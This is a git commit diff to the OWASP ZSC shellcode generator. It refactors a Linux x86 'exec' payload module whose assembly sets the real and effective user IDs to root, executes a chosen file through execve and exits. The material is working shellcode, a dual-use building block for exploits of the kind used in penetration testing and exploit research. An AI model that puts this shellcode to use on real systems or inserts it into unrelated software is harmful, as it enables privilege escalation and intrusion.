7409099f97b698fefaa605ebef77d3e451cc7048
Nong Hoang Tu <dmknght@parrotsec.org>
2021-08-03 02:33:54 +0700

    PUsh working code

--- owasp_zsc/modules/payloads/generator/linux_x86/exec.py
+++ owasp_zsc/modules/payloads/generator/linux_x86/exec.py
@@ -1,32 +1,34 @@
 """
 OWASP ZSC
+# Status: Tested the module for ASM compile. ASM code is good
 https://www.owasp.org/index.php/OWASP_ZSC_Tool_Project
 https://github.com/zscproject/OWASP-ZSC
 http://api.z3r0d4y.com/
 https://groups.google.com/d/forum/owasp-zsc [ owasp_zsc[at]googlegroups[dot]com ]
 """
-from owasp_zsc.new_cores import base_module
-from owasp_zsc.new_cores import stack
-# from owasp_zsc.libs.opcoder.linux_x86 import convert
+from owasp_zsc.new_cores import base_module, stack, alert
 
 
 class Module(base_module.BasePayload):
-    file_dest = base_module.OptString("", "Destination file")
+    target_file = base_module.OptString("", "Destination file")
 
     def generate(self):
-        payload = "mov    $0x46, % % al\n"
-        payload += "xor    %%ebx, %%ebx\n"
-        payload += "xor    %%ecx, %%ecx\n"
-        payload += "int    $0x80\n"
-        payload += stack.generate(self.file_dest, '%ebx', 'string')
-        payload += "mov    %%esp, %%ebx\n"
-        payload += "xor    %%eax, %%eax\n"
-        payload += "mov    $0xb, %%al\n"
-        payload += "int    $0x80\n"
-        payload += "mov    $0x1, %%al\n"
-        payload += "mov    $0x1, %%bl\n"
-        payload += "int    $0x80"
+        payload = "mov  $0x46, %al\n"
+        payload += "xor  %ebx, %ebx\n"
+        payload += "xor  %ecx, %ecx\n"
+        payload += "int  $0x80\n"
+        payload += stack.generate(self.target_file, '%ebx', 'string')
+        payload += "mov  %esp, %ebx\n"
+        payload += "xor  %eax, %eax\n"
+        payload += "mov  $0xb, %al\n"
+        payload += "int  $0x80\n"
+        payload += "mov  $0x1, %al\n"
+        payload += "mov  $0x1, %bl\n"
+        payload += "int  $0x80"
         return payload
 
     def run(self):
-        print(self.generate())
+        if not self.target_file:
+            alert.error("Target file is required")
+            return
+        self.handle_generate(__name__)
